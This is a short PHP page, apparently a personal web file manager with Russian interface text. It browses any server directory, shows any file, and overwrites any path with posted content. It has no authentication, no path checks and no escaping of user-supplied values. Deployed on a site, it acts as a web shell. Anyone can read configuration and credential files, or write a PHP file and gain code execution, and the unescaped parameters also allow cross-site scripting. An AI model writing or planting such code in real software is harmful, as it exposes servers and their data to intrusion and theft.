<!DOCTYPE html> 
<html> 
<head> 
	<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1">
	<style> 
		body{background: #222;color: #4CAF50; font-family: sans-serif; }
		form{float: right; width: 70%}
		textarea{ width: 100%; height: 80vh; font-size: 12px; background: #222; color: #4CAF50; word-wrap: normal;}
		button{ display: block; height: 50px; } 
		a{font-size: 30px;text-decoration: none;color: #4CAF50;}
		a:hover{ color: #fff; }
		.links{float: left; width: 30%;	}
	</style>
</head> 
<body> 

<div class="links">
	<?php
		if(isset($_POST['file']) && isset($_POST['save'])){
			$fp = fopen($_POST['file'], "w"); 
			$test = fwrite($fp, $_POST['save']);
			if ($test) echo 'Все ОК!';
			else echo 'Шото не то!';
			fclose($fp);
		}

		if(!isset($_GET['dir'])) $_GET['dir'] = '.';
		if ($handle = opendir($_GET['dir'])) {
		    while (false !== ($file = readdir($handle))) { 
		    	$path = $_GET['dir'].'/'.$file;
		    	$p = is_file($path) ? 'file=' : 'dir=';
		    	echo '<a href="gf.php?'.$p.$path.(is_file($path) ? '&dir='.$_GET['dir'] : '').'">'.$file.'</a><br>';
		    }
		    closedir($handle); 
		}
	?>    
</div>

<? if(isset($_GET['file'])): ?>
	<form action="gf.php" method="post"> 
		<textarea name="save"><?= htmlentities(file_get_contents($_GET['file']));?></textarea>
		<input type="text" name="file" value="<?= $_GET['file'];?>"> 
		<input type="submit" value="Сохранить">
	</form>
<? endif; ?>
</body> 
</html>

